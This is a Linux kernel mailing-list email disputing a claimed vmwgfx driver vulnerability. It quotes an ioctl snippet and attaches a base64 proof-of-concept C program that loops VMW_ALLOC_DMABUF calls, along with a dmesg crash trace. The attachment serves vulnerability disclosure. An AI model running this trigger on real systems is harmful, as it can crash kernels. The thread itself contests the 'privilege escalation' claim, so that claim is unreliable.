Return-Path: <dri-devel-bounces@lists.freedesktop.org>
X-Original-To: lists+dri-devel@lfdr.de
Delivered-To: lists+dri-devel@lfdr.de
Received: from gabe.freedesktop.org (gabe.freedesktop.org [IPv6:2610:10:20:722:a800:ff:fe36:1795])
	by mail.lfdr.de (Postfix) with ESMTPS id 68AB06A28C0
	for <lists+dri-devel@lfdr.de>; Sat, 25 Feb 2023 11:10:23 +0100 (CET)
Received: from gabe.freedesktop.org (localhost [127.0.0.1])
	by gabe.freedesktop.org (Postfix) with ESMTP id A58B110E111;
	Sat, 25 Feb 2023 10:10:10 +0000 (UTC)
X-Original-To: dri-devel@lists.freedesktop.org
Delivered-To: dri-devel@lists.freedesktop.org
X-Greylist: delayed 71135 seconds by postgrey-1.36 at gabe;
 Fri, 24 Feb 2023 02:48:47 UTC
Received: from smtpbgbr1.qq.com (smtpbgbr1.qq.com [54.207.19.206])
 by gabe.freedesktop.org (Postfix) with ESMTPS id 4003E10E551
 for <dri-devel@lists.freedesktop.org>; Fri, 24 Feb 2023 02:48:46 +0000 (UTC)
X-QQ-mid: bizesmtp68t1677206813tvw4reue
Received: from [10.4.23.76] ( [58.240.82.166]) by bizesmtp.qq.com (ESMTP) with 
 id ; Fri, 24 Feb 2023 10:46:52 +0800 (CST)
X-QQ-SSF: 01400000000000I0Z000000A0000000
X-QQ-FEAT: 3sPl0mbSw/DTl8kBd0+7loX2push1CWsmOXSDTlrJiMQje5UA8TXA8dYTDofE
 2CPM8h5FerZCTwwV4ADHHPLB7D6V8NgbpPWabgne+/GdmzriNuNRro4gBvNAGwnOyH1ZyND
 szk/eetmjTu45okfo7uEyR/DLDRbSMOvU4BElKzO3lNK6oYN4qSiPzVDiVQBGVsviCHAUvN
 jOG06a28Q9/rE1sr2tJBlWNGRWR5uAhu4oYnIiGPUgVP+xlXps3Fl0LfAhGEddJGKmX31Ev
 el1nmwg9Y+b5TCGbnTuc+zfol6f2quJka3Gy+h5tB6S9O845JcD6S/UajPO4gJbGu70uoGM
 ffwa3dT4TZfQWPhdFJxoBWgP2NVwKV+sqjVTWfvaKlvDq1FFY1246iOr2fcx4VUVPE6gCbG
X-QQ-GoodBg: 1
Content-Type: multipart/mixed; boundary="------------LzuPbzP7XSOZpmeKfDvh1pBt"
Message-ID: <113C6E516C95FA38+f2633fe9-fb5a-616e-0e35-7559750544c9@uniontech.com>
Date: Fri, 24 Feb 2023 10:46:51 +0800
MIME-Version: 1.0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101
 Thunderbird/102.8.0
Subject: Re: [PATCH v2] drm/vmwgfx: Work around VMW_ALLOC_DMABUF
To: Zack Rusin <zackr@vmware.com>, "daniel@ffwll.ch" <daniel@ffwll.ch>,
 "dri-devel@lists.freedesktop.org" <dri-devel@lists.freedesktop.org>,
 Linux-graphics-maintainer <Linux-graphics-maintainer@vmware.com>,
 "airlied@gmail.com" <airlied@gmail.com>,
 "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>
References: <20230223070405.20228-1-tangmeng@uniontech.com>
 <c5ba07a5ad3c6b101126a97eb094c51013ee83c0.camel@vmware.com>
From: Meng Tang <tangmeng@uniontech.com>
In-Reply-To: <c5ba07a5ad3c6b101126a97eb094c51013ee83c0.camel@vmware.com>
X-QQ-SENDSIZE: 520
Feedback-ID: bizesmtp:uniontech.com:qybglogicsvr:qybglogicsvr7
X-Mailman-Approved-At: Sat, 25 Feb 2023 10:10:08 +0000
X-BeenThere: dri-devel@lists.freedesktop.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Direct Rendering Infrastructure - Development
 <dri-devel.lists.freedesktop.org>
List-Unsubscribe: <https://lists.freedesktop.org/mailman/options/dri-devel>,
 <mailto:dri-devel-request@lists.freedesktop.org?subject=unsubscribe>
List-Archive: <https://lists.freedesktop.org/archives/dri-devel>
List-Post: <mailto:dri-devel@lists.freedesktop.org>
List-Help: <mailto:dri-devel-request@lists.freedesktop.org?subject=help>
List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/dri-devel>,
 <mailto:dri-devel-request@lists.freedesktop.org?subject=subscribe>
Errors-To: dri-devel-bounces@lists.freedesktop.org
Sender: "dri-devel" <dri-devel-bounces@lists.freedesktop.org>

This is a multi-part message in MIME format.
--------------LzuPbzP7XSOZpmeKfDvh1pBt
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

On 2023/2/23 20:50, Zack Rusin wrote:
> On Thu, 2023-02-23 at 15:04 +0800, Meng Tang wrote:
>> A privilege escalation vulnerability was found in vmwgfx driver
>> in drivers/gpu/drm/vmwgfx/vmwgfx_drv.c in GPU component of Linux
>> kernel with device file '/dev/dri/renderD128 (or Dxxx)'. This flaw
>> allows a local attacker with a user account on the system to gain
>> privilege, causing a denial of service(DoS).
>>
>> This vulnerability can be quickly verified by the following code
>> logic:
>> ...
>> dri_fd = open("/dev/dri/renderD128", O_RDWR);
>> ret = ioctl(dri_fd, 0xC0186441, &arg);
>> if (ret == 0) {
>>          printf("[*] VMW_ALLOC_DMABUF Success!\n");
>> }
>> ...
> 
> This is just regular usage of that ioctl. What's the vulnerability?
> 
Yes, this is a very common regular usage of that ioctl.
But if any user can operate /dev/dri/renderD128 through ioctl, it will 
lead to a vulnerability.
>>
>> Submit this commit to fix it.
> 
> No, this is incorrect. You're effectively just disabling the driver for normal
> apps/users using OpenGL or any accelerated contexts, which is going to completely
> break, well, essentially everything this driver is for. Being able to use ioctl's
> that were meant to be used is not a bug.
> 
> If you have a proof of concept or at least a description of the vulnerability that
> you've found I'd be happy to take a look at it.
> 
> z


$ ls /dev/dri/renderD128 -la
crw-rw----+ 1 root render 226, 128 2?  15 11:45 /dev/dri/renderD128

The permission of the file is ”crw-rw----+”.
I think only the root user or users with certain privileges can access 
the /dev/dri/renderD128 device file at this time.

But in fact, users can access /dev/dri/renderD128 through ioctl without 
permission.

Attachment poc.c is a test case, any user can execute the 
case(VMW_ALLOC_DMABUF) successfully, and eventually lead to a call 
trace(log see attachment dmesg.txt).

This will cause the user with permission VMW_ALLOC_DMABUF failed.

Therefore, I think that according to the permissions shown by 
“crw-rw----+ 1 root render”, only the root user or users with certain 
privileges can VMW_ALLOC_DMABUF success.
--------------LzuPbzP7XSOZpmeKfDvh1pBt
Content-Type: text/x-csrc; charset=UTF-8; name="poc.c"
Content-Disposition: attachment; filename="poc.c"
Content-Transfer-Encoding: base64

I2RlZmluZSBfR05VX1NPVVJDRQoKI2luY2x1ZGUgPGRpcmVudC5oPgojaW5jbHVkZSA8ZW5k
aWFuLmg+CiNpbmNsdWRlIDxlcnJuby5oPgojaW5jbHVkZSA8ZmNudGwuaD4KI2luY2x1ZGUg
PHNjaGVkLmg+CiNpbmNsdWRlIDxzaWduYWwuaD4KI2luY2x1ZGUgPHN0ZGFyZy5oPgojaW5j
bHVkZSA8c3RkYm9vbC5oPgojaW5jbHVkZSA8c3RkaW50Lmg+CiNpbmNsdWRlIDxzdGRpby5o
PgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHN5
cy9pb2N0bC5oPgojaW5jbHVkZSA8c3lzL3Jlc291cmNlLmg+CiNpbmNsdWRlIDxzeXMvc3Rh
dC5oPgojaW5jbHVkZSA8bGliZHJtL2RybS5oPgojaW5jbHVkZSA8c3lzL3N5c2NhbGwuaD4K
I2luY2x1ZGUgPHN5cy90aW1lLmg+CiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1ZGUg
PHN5cy93YWl0Lmg+CiNpbmNsdWRlIDx0aW1lLmg+CiNpbmNsdWRlIDx1bmlzdGQuaD4KCmlu
dCBhcmdbMHgxMF09ezB9OwppbnQgZHJpX2ZkID0tMTsKCnZvaWQgdHJpZ2dlcih2b2lkKQp7
CglpbnQgcmV0OwoJYXJnWzBdPTB4MTAwMDA7IAoKCXdoaWxlKDEpewoJCXJldD1pb2N0bChk
cmlfZmQsIDB4QzAxODY0NDEsICZhcmcpOwoJCWlmIChyZXQgIT0gMCApewoJCQlwcmludGYo
IlsqXSBWTVdfQUxMT0NfRE1BQlVGIEZhaWxlZFxuIik7CgoJCQlyZXR1cm4gOwoJCX0KCQlw
cmludGYoIlsqXSBWTVdfQUxMT0NfRE1BQlVGIGNyZWF0ZWRcbiIpOwoJfQp9CgppbnQgbWFp
bih2b2lkKQp7CglkcmlfZmQ9IG9wZW4oIi9kZXYvZHJpL3JlbmRlckQxMjgiLCBPX1JEV1Ip
OwoKCWlmKGRyaV9mZCA9PSAtMSkKCQlyZXR1cm47CgoJcHRocmVhZF90IHRpZDEsdGlkMjsK
CglpZihwdGhyZWFkX2NyZWF0ZSgmdGlkMSxOVUxMLHRyaWdnZXIsTlVMTCkpeyAKCQlwZXJy
b3IoIlsqXSB0aHJlYWRfY3JlYXRlIHRpZDFcbiIpOyAKCX0gCgoKCgl3aGlsZSgxKXsgCgkJ
c2xlZXAoMyk7IAoJfQoKCXJldHVybiAwOwp9Cg==
--------------LzuPbzP7XSOZpmeKfDvh1pBt
Content-Type: text/plain; charset=UTF-8; name="dmesg.txt"
Content-Disposition: attachment; filename="dmesg.txt"
Content-Transfer-Encoding: base64

WzU4NDIxLjczNTU5M10gLS0tLS0tLS0tLS0tWyBjdXQgaGVyZSBdLS0tLS0tLS0tLS0tCls1
ODQyMS43MzU1OTVdIGtlcm5lbCBCVUcgYXQgbW0vc2x1Yi5jOjM3OSEKWzU4NDIxLjczNTYw
M10gaW52YWxpZCBvcGNvZGU6IDAwMDAgWyMyXSBQUkVFTVBUIFNNUCBQVEkKWzU4NDIxLjcz
NTYwN10gQ1BVOiAwIFBJRDogMzE2NzAgQ29tbTogcG9jIFRhaW50ZWQ6IEcKWzU4NDIxLjcz
NTYxMV0gSGFyZHdhcmUgbmFtZTogaW5ub3RlayBHbWJIIFZpcnR1YWxCb3gvVmlydHVhbEJv
eCwgQklPUyBWaXJ0dWFsQm94IDEyLzAxLzIwMDYKWzU4NDIxLjczNTYxM10gUklQOiAwMDEw
OmtmcmVlKzB4Mjc4LzB4MmEwCls1ODQyMS43MzU2MjFdIENvZGU6IGZmIDRjIDhkIDcyIGZm
IGU5IDI2IGZlIGZmIGZmIDQ4IDhiIDU1IGM4IDRkIDg5IGY5IDQxIGI4IDAxIDAwIDAwIDAw
IDRjIDg5IGUxIDRjIDg5IGY2IDRjIDg5IGVmIGU4IGJkIGZhIGZmIGZmIGU5IGFmIGZlIGZm
IGZmIDwwZj4gMGIgMGYgMGIgODAgM2QgNGQgZjEgOTMgMDEgMDAgNzUgYTUgZTkgZjUgYTkg
OTQgMDAgNDggOGIgMTUgMWYKWzU4NDIxLjczNTYyNF0gUlNQOiAwMDE4OmZmZmY5ZWVhYzYz
ZjdjNzAgRUZMQUdTOiAwMDAxMDI0NgpbNTg0MjEuNzM1NjI3XSBSQVg6IGZmZmY5M2I1MTQy
ZWQ0MDAgUkJYOiBmZmZmOTNiNTE1MTgyMDAwIFJDWDogZmZmZjkzYjUxNDJlZDYwMApbNTg0
MjEuNzM1NjI5XSBSRFg6IDAwMDAwMDAwMDA5YzFjNDAgUlNJOiAwMDAwMDAwMDAwMDAwMDAw
IFJESTogZmZmZjkzYjUwMTA0MmIwMApbNTg0MjEuNzM1NjMxXSBSQlA6IGZmZmY5ZWVhYzYz
ZjdjYTggUjA4OiAwMDAwMDAwMDAwMDAwMDAwIFIwOTogYzAwMDAwMDBmZmZmZGZmZgpbNTg0
MjEuNzM1NjMzXSBSMTA6IDAwMDAwMDAwMDAwMDAwMDEgUjExOiBmZmZmOWVlYWM2M2Y3OWMw
IFIxMjogZmZmZjkzYjUxNDJlZDQwMApbNTg0MjEuNzM1NjM1XSBSMTM6IGZmZmY5M2I1MDEw
NDJiMDAgUjE0OiBmZmZmZDY0NjAwNTBiYjAwIFIxNTogZmZmZmZmZmZjMDM1NTkxMQpbNTg0
MjEuNzM1NjM3XSBGUzogIDAwMDA3Zjc5OTBhNTU3MDAoMDAwMCkgR1M6ZmZmZjkzYjViZGEw
MDAwMCgwMDAwKSBrbmxHUzowMDAwMDAwMDAwMDAwMDAwCls1ODQyMS43MzU2MzldIENTOiAg
MDAxMCBEUzogMDAwMCBFUzogMDAwMCBDUjA6IDAwMDAwMDAwODAwNTAwMzMKWzU4NDIxLjcz
NTY0MV0gQ1IyOiAwMDAwN2Y3OThjMDAwMDEwIENSMzogMDAwMDAwMDAwZTkxYTAwMiBDUjQ6
IDAwMDAwMDAwMDAwNzA2ZjAKWzU4NDIxLjczNTY0Nl0gQ2FsbCBUcmFjZToKWzU4NDIxLjcz
NTY0OF0gIDxUQVNLPgpbNTg0MjEuNzM1NjUyXSAgdm13X2JvX2NyZWF0ZSsweDkxLzB4YzAg
W3Ztd2dmeF0KWzU4NDIxLjczNTY2NF0gIHZtd19nZW1fb2JqZWN0X2NyZWF0ZV93aXRoX2hh
bmRsZSsweDRjLzB4YzAgW3Ztd2dmeF0KWzU4NDIxLjczNTY3Nl0gID8gX3Jhd19zcGluX3Vu
bG9ja19pcnFyZXN0b3JlKzB4MjcvMHg0MwpbNTg0MjEuNzM1NjgzXSAgPyB2bXdfZ2VtX29i
amVjdF9jcmVhdGVfd2l0aF9oYW5kbGUrMHhjMC8weGMwIFt2bXdnZnhdCls1ODQyMS43MzU2
OTJdICB2bXdfZ2VtX29iamVjdF9jcmVhdGVfaW9jdGwrMHgzYi8weDkwIFt2bXdnZnhdCls1
ODQyMS43MzU3MDRdICBkcm1faW9jdGxfa2VybmVsKzB4YmEvMHgxNTAgW2RybV0KWzU4NDIx
LjczNTc2OV0gIGRybV9pb2N0bCsweDI1OC8weDQzMCBbZHJtXQpbNTg0MjEuNzM1Nzg2XSAg
PyB2bXdfZ2VtX29iamVjdF9jcmVhdGVfd2l0aF9oYW5kbGUrMHhjMC8weGMwIFt2bXdnZnhd
Cls1ODQyMS43MzU3OTVdICA/IHNlY3VyaXR5X2NhcGFibGUrMHgzZi8weDYwCls1ODQyMS43
MzU4MDNdICA/IGRybV9pb2N0bF9rZXJuZWwrMHgxNTAvMHgxNTAgW2RybV0KWzU4NDIxLjcz
NTgyMV0gID8gZHJtX2lvY3RsX2tlcm5lbCsweDE1MC8weDE1MCBbZHJtXQpbNTg0MjEuNzM1
ODM5XSAgdm13X2dlbmVyaWNfaW9jdGwrMHg4OC8weDE2MCBbdm13Z2Z4XQpbNTg0MjEuNzM1
ODUxXSAgdm13X3VubG9ja2VkX2lvY3RsKzB4MTUvMHgyMCBbdm13Z2Z4XQpbNTg0MjEuNzM1
ODYxXSAgX194NjRfc3lzX2lvY3RsKzB4OTYvMHhkMApbNTg0MjEuNzM1ODY5XSAgZG9fc3lz
Y2FsbF82NCsweDNhLzB4YzAKWzU4NDIxLjczNTg3NF0gIGVudHJ5X1NZU0NBTExfNjRfYWZ0
ZXJfaHdmcmFtZSsweDYxLzB4Y2IKWzU4NDIxLjczNTg3OF0gUklQOiAwMDMzOjB4N2Y3OTkw
YjQ5NTk3Cls1ODQyMS43MzU4ODJdIENvZGU6IDAwIDAwIDkwIDQ4IDhiIDA1IGY5IGE4IDBj
IDAwIDY0IGM3IDAwIDI2IDAwIDAwIDAwIDQ4IGM3IGMwIGZmIGZmIGZmIGZmIGMzIDY2IDJl
IDBmIDFmIDg0IDAwIDAwIDAwIDAwIDAwIGI4IDEwIDAwIDAwIDAwIDBmIDA1IDw0OD4gM2Qg
MDEgZjAgZmYgZmYgNzMgMDEgYzMgNDggOGIgMGQgYzkgYTggMGMgMDAgZjcgZDggNjQgODkg
MDEgNDgKWzU4NDIxLjczNTg4NV0gUlNQOiAwMDJiOjAwMDA3Zjc5OTBhNTRlZDggRUZMQUdT
OiAwMDAwMDI0NiBPUklHX1JBWDogMDAwMDAwMDAwMDAwMDAxMApbNTg0MjEuNzM1ODg3XSBS
QVg6IGZmZmZmZmZmZmZmZmZmZGEgUkJYOiAwMDAwMDAwMDAwMDAwMDAwIFJDWDogMDAwMDdm
Nzk5MGI0OTU5NwpbNTg0MjEuNzM1ODg5XSBSRFg6IDAwMDAwMDAwMDA0MDQwODAgUlNJOiAw
MDAwMDAwMGMwMTg2NDQxIFJESTogMDAwMDAwMDAwMDAwMDAwMwpbNTg0MjEuNzM1ODkwXSBS
QlA6IDAwMDA3Zjc5OTBhNTRlZjAgUjA4OiAwMDAwMDAwMDAwMDAwMDAwIFIwOTogMDAwMDAw
MDAwMDAwMDA3NwpbNTg0MjEuNzM1ODkxXSBSMTA6IDAwMDA3Zjc5OGMwMDA4ZDAgUjExOiAw
MDAwMDAwMDAwMDAwMjQ2IFIxMjogMDAwMDdmZmRiM2U4OWYyZQpbNTg0MjEuNzM1ODkyXSBS
MTM6IDAwMDA3ZmZkYjNlODlmMmYgUjE0OiAwMDAwN2Y3OTkwYTU1NzAwIFIxNTogMDAwMDAw
MDAwMDAwMDAwMApbNTg0MjEuNzM1ODk0XSAgPC9UQVNLPg==

--------------LzuPbzP7XSOZpmeKfDvh1pBt--
